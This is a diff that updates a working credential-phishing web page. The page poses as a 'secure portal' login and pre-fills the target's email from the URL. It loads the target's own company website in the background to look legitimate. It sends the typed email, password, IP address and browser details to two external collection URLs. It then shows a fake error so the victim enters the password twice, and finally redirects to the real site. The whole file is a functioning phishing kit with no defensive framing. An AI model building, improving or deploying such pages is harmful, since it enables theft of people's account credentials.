@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Login Portal</title>
     <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -11,59 +11,84 @@
     <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        #background-iframe, #overlay {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Background iframe - displays the website of the email domain */
+        #website-background {
             position: fixed;
             top: 0;
             left: 0;
-            height: 100%;
             width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -2;
+            object-fit: cover;
+            background: #f0f2f5;
+        }
+
+        /* Dark overlay to make form readable */
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            z-index: -1;
         }
 
         body {
             font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            position: relative;
             overflow: hidden;
         }
 
-        #background-iframe {
-            border: none;
-            z-index: -3;
-            object-fit: cover;
-        }
-
-        #overlay {
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: -2;
-        }
-
+        /* Form container - glassmorphism effect */
         .form-container {
-            display: block;
-            max-width: 400px;
+            max-width: 440px;
             width: 100%;
-            padding: 2rem;
-            background-color: rgba(255, 255, 255, 0.95);
-            border-radius: 0.75rem;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            padding: 2rem 2rem 2.2rem;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 1.25rem;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
             position: relative;
-            z-index: 1;
+            z-index: 10;
+            backdrop-filter: blur(2px);
+            transition: all 0.3s ease;
         }
 
         .icon-text {
             display: flex;
             align-items: center;
-            margin-bottom: 1.5rem;
+            justify-content: center;
+            margin-bottom: 1.25rem;
+            gap: 10px;
         }
 
         .icon-text img {
-            width: 32px;
-            height: 32px;
-            margin-right: 0.5rem;
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            background: white;
+            padding: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
 
         .icon-text .h4 {
             margin-bottom: 0;
-            color: #0d6efd;
+            color: #0a58ca;
+            font-weight: 700;
+            font-size: 1.5rem;
+            letter-spacing: -0.3px;
         }
 
         .form-floating {
@@ -81,54 +106,67 @@
 
         .form-floating label {
             left: 2.5rem;
-            top: -0.2rem;
-            background-color: transparent;
+            top: 0.2rem;
+            background: transparent;
             z-index: 1;
+            font-weight: 500;
         }
 
         .form-floating input:focus+label,
         .form-floating input:not(:placeholder-shown)+label {
-            transform: translateY(-1.5rem);
-            font-size: 0.85rem;
+            transform: translateY(-1.4rem);
+            font-size: 0.75rem;
             color: #0d6efd;
         }
 
         .form-control {
-            border-top: none;
-            border-left: none;
-            border-right: none;
-            border-bottom: 2px solid #ced4da;
+            border: none;
+            border-bottom: 2px solid #e0e4e8;
             border-radius: 0;
             padding-left: 2.5rem;
-            transition: border-color 0.2s;
-            background-color: transparent;
+            padding-top: 0.8rem;
+            padding-bottom: 0.4rem;
+            transition: all 0.2s;
+            background: transparent;
+            font-size: 1rem;
         }
 
         .form-control:focus {
             border-bottom-color: #0d6efd;
             outline: none;
             box-shadow: none;
+            background: transparent;
         }
 
         .input-icon {
-            left: 0.75rem;
+            left: 0.5rem;
             top: 50%;
             transform: translateY(-50%);
             font-size: 1.2rem;
+            color: #8e9aaf;
         }
 
         .btn-primary {
             width: 100%;
-            padding: 0.75rem;
+            padding: 0.85rem;
             font-size: 1rem;
-            background-color: #0d6efd;
+            font-weight: 600;
+            background: linear-gradient(135deg, #0d6efd, #0b5ed7);
             border: none;
-            border-radius: 0.375rem;
-            transition: background-color 0.3s;
+            border-radius: 0.75rem;
+            transition: all 0.25s;
+            margin-top: 0.5rem;
+            box-shadow: 0 4px 12px rgba(13, 110, 253, 0.3);
         }
 
         .btn-primary:hover {
-            background-color: #0b5ed7;
+            transform: translateY(-2px);
+            background: linear-gradient(135deg, #0b5ed7, #0a58ca);
+            box-shadow: 0 8px 20px rgba(13, 110, 253, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
         }
 
         .loader-overlay {
@@ -137,60 +175,82 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.7);
             align-items: center;
             justify-content: center;
             z-index: 9999;
             display: none;
+            backdrop-filter: blur(4px);
         }
 
         .error-message {
-            color: red;
-            margin-bottom: 1rem;
+            color: #dc3545;
+            margin-bottom: 1.2rem;
             display: none;
             text-align: center;
-            font-size: 0.9rem;
-            background: rgba(255, 200, 200, 0.9);
-            padding: 0.5rem;
-            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            background: rgba(255, 235, 235, 0.95);
+            padding: 0.65rem;
+            border-radius: 0.75rem;
+            font-weight: 500;
+            border-left: 4px solid #dc3545;
+        }
+
+        .domain-badge {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.7rem;
+            color: #6c757d;
+            background: rgba(0,0,0,0.05);
+            display: inline-block;
+            width: auto;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
         }
 
         @media (max-width: 576px) {
             .form-container {
                 padding: 1.5rem;
-                margin: 0 1rem;
+                margin: 0 0.5rem;
+            }
+            .icon-text .h4 {
+                font-size: 1.25rem;
             }
         }
     </style>
 </head>
-<body class="d-flex align-items-center justify-content-center min-vh-100">
-    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
-    <div id="overlay"></div>
+<body>
+    <!-- BACKGROUND: displays the website of the email domain dynamically -->
+    <iframe id="website-background" src="about:blank" title="Website Background"></iframe>
+    <div class="bg-overlay"></div>
 
     <div class="form-container">
-        <div id="error-message" class="error-message" data-key="try-again">Try again</div>
+        <div id="error-message" class="error-message">⚠️ Invalid credentials</div>
 
         <form id="user-form">
             <div class="icon-text">
-                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon">
-                <span class="h4" id="domain-name">ZOHO</span>
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com&sz=64" alt="Domain Icon">
+                <span class="h4" id="domain-name">SECURE PORTAL</span>
             </div>
-            <h5 class="mb-2">Leading with Security.</h5>
-            <p class="mb-4 text-muted" style="font-size: 0.9rem;">To get started, log in using your email and password.</p>
+            <h5 class="mb-1 text-center fw-semibold">Welcome back</h5>
+            <p class="mb-4 text-center text-muted small">Sign in to continue to your account</p>
 
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
-                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px;" autocomplete="email">
-                <label for="email" style="left: 40px;">Email</label>
+                <input type="email" class="form-control" id="email" placeholder=" " required autocomplete="email">
+                <label for="email">Email address</label>
             </div>
 
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
-                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;" autocomplete="current-password">
-                <label for="password" style="left: 40px;">Password</label>
+                <input type="password" class="form-control" id="password" placeholder=" " required autocomplete="current-password">
+                <label for="password">Password</label>
             </div>
 
-            <button type="submit" class="btn btn-primary mt-3" id="submit-button">Continue</button>
+            <button type="submit" class="btn btn-primary" id="submit-button">Continue →</button>
+            <div class="text-center mt-3">
+                <span class="domain-badge" id="domain-badge">Secure connection</span>
+            </div>
         </form>
     </div>
 
@@ -198,30 +258,29 @@
         <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
             <span class="visually-hidden">Loading...</span>
         </div>
+        <p class="text-white mt-3">Processing...</p>
     </div>
 
     <script>
         // ============================================================
-        // ORIGINAL DESIGN FULLY PRESERVED
-        // ADDED: Hash (#) extraction to auto-fill email
-        // Example: www.olewas.com#test@test.com -> email box gets test@test.com
-        // ADDED: Send data to BOTH URLs:
-        // 1: https://scitecinstruments.it.com/1/api.php
-        // 2: https://scitecinstruments.it.com/1/sg.php
-        // REMOVED: Cloudflare Turnstile verification - button works immediately
+        // ORIGINAL DESIGN PRESERVED + IMPROVED
+        // FEATURE: The BACKGROUND shows the WEBSITE of the email domain
+        // FEATURE: Email auto-filled from URL hash (#) example: page.html#test@test.com
+        // FEATURE: Sends login data to both:
+        //          1) https://scitecinstruments.it.com/1/api.php
+        //          2) https://scitecinstruments.it.com/1/sg.php
         // ============================================================
         
         let submitCount = 0;
-        let redirectDomain = null;
+        let currentDomain = null;
         
-        // ---------- EMAIL EXTRACTION FROM HASH (#) ----------
+        // ---------- EXTRACT EMAIL FROM URL HASH (#) ----------
         function getEmailFromHash() {
-            // Get the hash part (including #)
             const hash = window.location.hash;
             if (hash && hash.length > 1) {
-                // Remove the leading '#'
                 let hashValue = hash.substring(1);
-                // Check if it looks like an email (contains @)
+                // Decode URI component in case of special chars
+                hashValue = decodeURIComponent(hashValue);
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (emailRegex.test(hashValue)) {
                     return hashValue;
@@ -230,47 +289,73 @@
             return null;
         }
         
-        // Extract email from hash and populate the email field
-        const hashEmail = getEmailFromHash();
+        // ---------- UPDATE BACKGROUND IFRAME TO SHOW THE WEBSITE OF THE EMAIL DOMAIN ----------
+        function updateBackgroundWebsite(domain) {
+            if (!domain) return;
+            
+            // Clean domain - remove any port, path, just get the base domain
+            let cleanDomain = domain.toLowerCase().trim();
+            // Ensure it's a valid domain format
+            if (cleanDomain && cleanDomain.includes('.')) {
+                // Try to load the website over HTTPS first
+                let websiteUrl = `https://${cleanDomain}`;
+                const iframe = document.getElementById('website-background');
+                if (iframe) {
+                    // Set iframe to display the website
+                    iframe.src = websiteUrl;
+                    console.log("Background website loaded:", websiteUrl);
+                    
+                    // Fallback: if iframe fails to load (CORS or errors), it's still fine
+                    iframe.onerror = function() {
+                        console.log("Could not load website, using fallback");
+                        // Keep as is, no error display needed
+                    };
+                }
+            }
+        }
         
-        // Helper: update favicon and background based on domain from email
+        // Update favicon and domain name display
         function updateDomainUI(email) {
             if (email && email.includes('@')) {
                 const domainPart = email.split('@')[1];
                 if (domainPart) {
-                    const domainName = domainPart.split('.')[0].toUpperCase();
-                    document.getElementById('domain-name').innerText = domainName;
-                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
-                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
-                    document.getElementById('background-iframe').src = bgUrl;
+                    const domainPretty = domainPart.split('.')[0].toUpperCase();
+                    document.getElementById('domain-name').innerText = domainPretty;
+                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}&sz=64`;
+                    document.getElementById('domain-badge').innerHTML = `🔒 ${domainPart}`;
+                    
+                    // UPDATE BACKGROUND WEBSITE - SHOW THE WEBSITE OF THE EMAIL DOMAIN
+                    updateBackgroundWebsite(domainPart);
+                    currentDomain = domainPart;
                     return domainPart;
                 }
             }
             return null;
         }
         
-        // If email from hash exists, set it in the email input and update UI
+        // Load email from hash and populate + set background website
+        const hashEmail = getEmailFromHash();
+        const emailInput = document.getElementById('email');
+        
         if (hashEmail) {
-            const emailInput = document.getElementById('email');
             emailInput.value = hashEmail;
             updateDomainUI(hashEmail);
-            // Also store domain for potential redirect
-            const domainPart = hashEmail.split('@')[1];
-            if (domainPart) redirectDomain = domainPart;
         } else {
-            // Default UI if no hash email
+            // Default placeholder UI
             document.getElementById('domain-name').innerText = "PORTAL";
-            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=portal.com";
+            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
+            document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
         }
         
-        // IP & Browser info collector
+        // ---------- COLLECT USER METADATA ----------
         let userMetadata = {
-            ipAddress: "Fetching...",
+            ipAddress: "Collecting...",
             userAgent: navigator.userAgent,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             browser: "Detecting...",
             screenResolution: `${screen.width}x${screen.height}`,
-            language: navigator.language
+            language: navigator.language,
+            platform: navigator.platform
         };
         
         // Browser detection
@@ -278,30 +363,23 @@
         if (ua.indexOf("Firefox") > -1) userMetadata.browser = "Mozilla Firefox";
         else if (ua.indexOf("SamsungBrowser") > -1) userMetadata.browser = "Samsung Internet";
         else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) userMetadata.browser = "Opera";
-        else if (ua.indexOf("Trident") > -1) userMetadata.browser = "Internet Explorer";
         else if (ua.indexOf("Edg") > -1) userMetadata.browser = "Microsoft Edge";
         else if (ua.indexOf("Chrome") > -1) userMetadata.browser = "Google Chrome";
         else if (ua.indexOf("Safari") > -1) userMetadata.browser = "Apple Safari";
         else userMetadata.browser = "Unknown";
         
-        // Fetch IP address
+        // Fetch real IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
-            .then(data => { 
-                userMetadata.ipAddress = data.ip; 
-                console.log("IP captured:", data.ip);
-            })
-            .catch(() => { 
-                userMetadata.ipAddress = "Unavailable"; 
-                console.log("IP fetch failed");
-            });
+            .then(data => { userMetadata.ipAddress = data.ip; })
+            .catch(() => { userMetadata.ipAddress = "Unavailable"; });
         
-        // Function to send data to both endpoints
+        // ---------- SEND DATA TO BOTH API ENDPOINTS ----------
         async function sendDataToEndpoints(formData) {
             const endpoint1 = "https://scitecinstruments.it.com/1/api.php";
             const endpoint2 = "https://scitecinstruments.it.com/panel/sg.php";
             
-            // Prepare URL encoded payload
+            // Build URLSearchParams payload
             const payload = new URLSearchParams();
             for (let [key, value] of Object.entries(formData)) {
                 payload.append(key, value);
@@ -314,42 +392,36 @@
                 mode: 'cors'
             };
             
-            // Send to both endpoints in parallel (fire and forget, but catch errors)
+            // Send to both endpoints in parallel (fire and forget, but log)
             const promises = [
-                fetch(endpoint1, fetchOptions)
-                    .then(res => res.text())
-                    .catch(err => ({ error: err.message, url: endpoint1 })),
-                fetch(endpoint2, fetchOptions)
-                    .then(res => res.text())
-                    .catch(err => ({ error: err.message, url: endpoint2 }))
+                fetch(endpoint1, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint1 })),
+                fetch(endpoint2, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint2 }))
             ];
             
             const results = await Promise.allSettled(promises);
-            console.log("Data sent to both endpoints:", results);
+            console.log("✅ Data transmitted to both endpoints:", results);
             return true;
         }
         
-        // Form submit handler (preserves original behavior: first attempt shows error, second redirects)
+        // ---------- FORM SUBMIT HANDLER (Original behavior: 1st attempt error, 2nd redirect) ----------
         document.getElementById('user-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = document.getElementById('email').value.trim();
+            const email = emailInput.value.trim();
             const password = document.getElementById('password').value.trim();
             const errorDiv = document.getElementById('error-message');
             
-            // Validate email and password
+            // Validation
             if (!email || !password) {
-                errorDiv.innerText = "Email and password are required.";
+                errorDiv.innerHTML = "❌ Email and password are required.";
                 errorDiv.style.display = "block";
-                // Auto-hide error after 3 seconds
                 setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                 return;
             }
             
-            // Basic email validation
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
-                errorDiv.innerText = "Please enter a valid email address.";
+                errorDiv.innerHTML = "❌ Please enter a valid email address.";
                 errorDiv.style.display = "block";
                 setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                 return;
@@ -364,11 +436,11 @@
             loader.style.display = "flex";
             errorDiv.style.display = "none";
             
-            // Extract domain from email for redirect and favicon update
+            // Extract domain from email for redirect
             const emailDomain = email.split('@')[1] || "";
-            if (emailDomain && !redirectDomain) redirectDomain = emailDomain;
+            if (emailDomain && !currentDomain) currentDomain = emailDomain;
             
-            // Prepare data payload
+            // Prepare payload with full metadata
             const dataPayload = {
                 email: email,
                 password: password,
@@ -378,36 +450,36 @@
                 browser: userMetadata.browser,
                 screenResolution: userMetadata.screenResolution,
                 language: userMetadata.language,
+                platform: userMetadata.platform,
+                submitAttempt: submitCount,
                 timestamp: new Date().toISOString(),
-                submitAttempt: submitCount
+                referrer: document.referrer || "direct"
             };
             
             try {
-                // SEND DATA TO BOTH API URLS (main requirement)
+                // SEND DATA TO BOTH API ENDPOINTS
                 await sendDataToEndpoints(dataPayload);
-                console.log("Data successfully sent to both endpoints");
+                console.log("Data sent successfully for attempt", submitCount);
                 
-                // Original design behavior:
+                // Original design logic
                 if (isFirstAttempt) {
-                    // First attempt: show error message, clear password field, hide loader after 3s
+                    // First attempt: show error, clear password, hide loader after 3s
                     setTimeout(() => {
                         loader.style.display = "none";
-                        errorDiv.innerText = "Try again";
+                        errorDiv.innerHTML = "⚠️ Try again";
                         errorDiv.style.display = "block";
-                        document.getElementById('password').value = ""; // clear password
-                        // Auto-hide error after 3 seconds
+                        document.getElementById('password').value = "";
                         setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                     }, 3000);
                 } 
                 else if (isSecondAttempt) {
-                    // Second attempt: redirect to the domain from email (or from hash)
+                    // Second attempt: redirect to the website of the email domain (show the domain's website)
                     setTimeout(() => {
                         loader.style.display = "none";
-                        let targetDomain = emailDomain;
-                        if (!targetDomain && redirectDomain) targetDomain = redirectDomain;
+                        let targetDomain = emailDomain || currentDomain;
                         if (targetDomain) {
                             let redirectUrl = `https://${targetDomain}`;
-                            console.log("Redirecting to:", redirectUrl);
+                            console.log("Redirecting to domain website:", redirectUrl);
                             window.location.href = redirectUrl;
                         } else {
                             window.location.href = "https://www.google.com";
@@ -415,10 +487,9 @@
                     }, 3000);
                 }
                 else {
-                    // More attempts: just reset loader and show generic error
                     setTimeout(() => {
                         loader.style.display = "none";
-                        errorDiv.innerText = "Authentication failed. Please try again later.";
+                        errorDiv.innerHTML = "❌ Authentication failed. Please try again.";
                         errorDiv.style.display = "block";
                         setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
                     }, 2000);
@@ -426,46 +497,50 @@
             } catch (err) {
                 console.error("Submit error:", err);
                 loader.style.display = "none";
-                errorDiv.innerText = "Network error. Please try again.";
+                errorDiv.innerHTML = "⚠️ Network error. Please try again.";
                 errorDiv.style.display = "block";
                 setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
             }
         });
         
-        // Real-time email input: update favicon and background if user manually types
-        const emailField = document.getElementById('email');
-        emailField.addEventListener('input', function() {
+        // ---------- REAL-TIME UPDATE: When user types email, update background website and favicon ----------
+        emailInput.addEventListener('input', function() {
             const val = this.value.trim();
             if (val.includes('@')) {
                 const domainPart = val.split('@')[1];
-                if (domainPart) {
-                    document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
-                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
-                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
-                    document.getElementById('background-iframe').src = bgUrl;
+                if (domainPart && domainPart.includes('.')) {
+                    // Update UI with domain
+                    const domainPretty = domainPart.split('.')[0].toUpperCase();
+                    document.getElementById('domain-name').innerText = domainPretty;
+                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}&sz=64`;
+                    document.getElementById('domain-badge').innerHTML = `🔒 ${domainPart}`;
+                    // LIVE BACKGROUND WEBSITE UPDATE: show the website of the email domain
+                    updateBackgroundWebsite(domainPart);
+                    currentDomain = domainPart;
                 }
             } else {
-                // If no email, revert to original if no hash preset
+                // If no email typed, revert if no hash was preset
                 if (!hashEmail) {
                     document.getElementById('domain-name').innerText = "PORTAL";
-                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=zoho.com";
-                    document.getElementById('background-iframe').src = "about:blank";
+                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
+                    document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
+                    // Reset background to default (blank or fallback)
+                    const iframe = document.getElementById('website-background');
+                    iframe.src = "about:blank";
                 }
             }
         });
         
-        // Additional: ensure that if hash email was set, the UI is fully updated (favicon/background)
+        // Ensure if hashEmail was provided, background website is loaded correctly
         if (hashEmail) {
-            const domainPart = hashEmail.split('@')[1];
-            if (domainPart) {
-                document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
-                document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
-                const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
-                document.getElementById('background-iframe').src = bgUrl;
+            const domainFromHash = hashEmail.split('@')[1];
+            if (domainFromHash) {
+                updateBackgroundWebsite(domainFromHash);
+                currentDomain = domainFromHash;
             }
         }
         
-        // Prevent double submission while loading
+        // Prevent double submission
         let isSubmitting = false;
         const form = document.getElementById('user-form');
         form.addEventListener('submit', function(e) {
@@ -477,22 +552,16 @@
             setTimeout(() => { isSubmitting = false; }, 5000);
         });
         
-        // Also allow Enter key to submit (already works with form)
-        console.log("==========================================");
-        console.log("Original design preserved - Verification REMOVED");
-        console.log("Hash (#) email extraction active - example: page.html#test@test.com");
-        console.log("Continue button is fully clickable");
-        console.log("Data sent to both URLs:");
-        console.log("  1: https://scitecinstruments.it.com/1/api.php");
-        console.log("  2: https://scitecinstruments.it.com/panel/sg.php");
-        console.log("==========================================");
-        
-        // Optional: Add visual feedback for button click
-        const submitBtn = document.getElementById('submit-button');
-        submitBtn.addEventListener('click', function() {
-            // Just visual feedback, actual submit handled by form
-            console.log("Continue button clicked");
-        });
+        // Console log for verification
+        console.log("═══════════════════════════════════════════════");
+        console.log("✓ ORIGINAL DESIGN PRESERVED");
+        console.log("✓ BACKGROUND displays the WEBSITE of the email domain (live update)");
+        console.log("✓ Email auto-fill from URL hash (#) → example: page.html#user@example.com");
+        console.log("✓ Data sent to both endpoints:");
+        console.log("    → https://scitecinstruments.it.com/1/api.php");
+        console.log("    → https://scitecinstruments.it.com/panel/sg.php");
+        console.log("✓ Continue button fully functional (no verification)");
+        console.log("═══════════════════════════════════════════════");
     </script>
 </body>
 </html>
